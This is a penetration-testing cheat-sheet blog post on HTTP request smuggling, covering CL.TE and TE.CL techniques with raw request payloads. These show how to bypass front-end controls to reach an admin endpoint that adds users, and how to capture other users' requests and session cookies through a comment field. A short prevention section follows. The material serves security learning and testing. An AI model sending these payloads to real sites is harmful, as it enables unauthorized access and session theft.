---
title: "HTTP request smuggling"
subtitle: ""
date: 2020-03-04T15:58:26+08:00
lastmod: 2020-03-04T15:58:26+08:00
draft: false
author: "Hato0"
description: "SQL injection cheatsheet"

tags: ["web", "penetest", "HTTPRS"]
categories: ["Penetest - Web"]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# HTTP request smuggling

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

HTTP request smuggling is an attack based on bad request handling between front and backend. The front end receive the user packet and transfer data or request to the backend. In that way you can chunk your original request and perform a double request in one paquet send. In that way you can bypass some protections.  

Different types of HTTP request smuggling exist, they are :

-   CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
-   TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
-   TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

## Basics

- Basic CL.TE vulnerability

	You have to send a chunk request passing low content length to perform double requests in one, Here is an example:
	
	{{< highlight http "lineNos=false" >}}
	POST / HTTP/1.1  
	Host: WEBSITE  
	Connection: keep-alive  
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 6  
	Transfer-Encoding: chunked  

	0  

	G
	{{< /highlight >}}
	
	
- Basic TE.CL vulnerability

	Same as previous with a well formed double request, here is an example:
	
	{{< highlight http "lineNos=false" >}}
	POST / HTTP/1.1  
	Host: WEBSITE  
	Content-Type: application/x-www-form-urlencoded  
	Content-length: 4  
	Transfer-Encoding: chunked  

	5c  
	GPOST / HTTP/1.1  
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 15  

	x=1  
	0

	{{< /highlight >}}
	
	
## Confirming vulnerabilities

- Confirming a CL.TE vulnerability via differential responses

	Using same technique as previous you can target a page you are sure about the response like 404, home or whatever. The request should return the page on the second header. Here is an example
	
	{{< highlight http "lineNos=false" >}}
	POST / HTTP/1.1  
	Host: WEBSITE 
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 35  
	Transfer-Encoding: chunked  

	0  

	GET /404 HTTP/1.1  
	X-Ignore: X

	{{< /highlight >}}
	
- Confirming a TE.CL vulnerability via differential responses

	Same thing as before just a different way to do it.  Here is an example:
	
	{{< highlight http "lineNos=false" >}}
	POST / HTTP/1.1  
	Host: WEBSITE
	Content-Type: application/x-www-form-urlencoded  
	Content-length: 4  
	Transfer-Encoding: chunked  

	5e  
	POST /404 HTTP/1.1  
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 15  

	x=1  
	0

	{{< /highlight >}}
	
	
## Bypass front-end protections
- Bypass front-end security controls, CL.TE vulnerability

	Here is an example of how you can bypass the front to make the back do what you want (that's an example and you really have to adapt it):
	
	{{< highlight http "lineNos=false" >}}
POST / HTTP/1.1  
Host: WEBSITE
Content-Type: application/x-www-form-urlencoded  
Content-Length: 139  
Transfer-Encoding: chunked  
    
0  
    
GET /admin/add?username=test&password=test HTTP/1.1  
Host: localhost  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 10  
    
x=
	{{< /highlight >}}
	
	
- Bypass front-end security controls, TE.CL vulnerability

	Same thing as before, just the necessary change:
	
	{{< highlight http "lineNos=false" >}}
	POST / HTTP/1.1  
	Host: WEBSITE  
	Content-length: 4  
	Transfer-Encoding: chunked  

	87  
	GET /admin/add?username=test&password=test HTTP/1.1  
	Host: localhost  
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 15  

	x=1  
	0

	{{< /highlight >}}

## Advanced

- Exploiting HTTP request smuggling to capture other users' requests

	You need to be able to have a field that is at the end of your post data and to be able to update a site field or comment or post or ... In that way you will catch the other user requests by redirect it back to your data in your post request. Here is an example: 
	
	{{< highlight http "lineNos=false" >}}
	GET / HTTP/1.1  
	Host: WEBSITE 
	Transfer-Encoding: chunked  
	Content-Length: 324  

	0  

	POST /post/comment HTTP/1.1  
	Host: WEBSITE  
	Content-Type: application/x-www-form-urlencoded  
	Content-Length: 400  
	Cookie: session=YOURCOOKIE

	csrf=CSRFTOKEN&postId=2&name=YOURNAME&email=EMAIL&comment=
	
	
	{{< /highlight >}}


## How to prevent them

How can implement a rejection of wierd / malformed request or also do these following actions :

-   Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.
-   Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.
-   Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests.